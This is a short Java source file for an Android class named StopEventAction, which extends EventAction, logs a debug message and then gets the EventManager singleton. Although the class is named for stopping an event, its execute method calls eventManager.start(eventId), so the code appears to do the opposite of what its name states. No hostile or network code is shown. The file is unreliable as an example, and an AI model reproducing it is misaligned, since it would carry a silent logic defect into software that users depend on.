package com.android.service.action;

import org.json.JSONObject;

import com.android.service.auto.Cfg;
import com.android.service.event.EventManager;
import com.android.service.util.Check;

public class StopEventAction extends EventAction {
	private static final String TAG = "StopEventAction";

	public StopEventAction(ActionConf params) {
		super( params);
	}

	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		final EventManager eventManager = EventManager.self();

		eventManager.start(eventId);
		return true;
	}

}
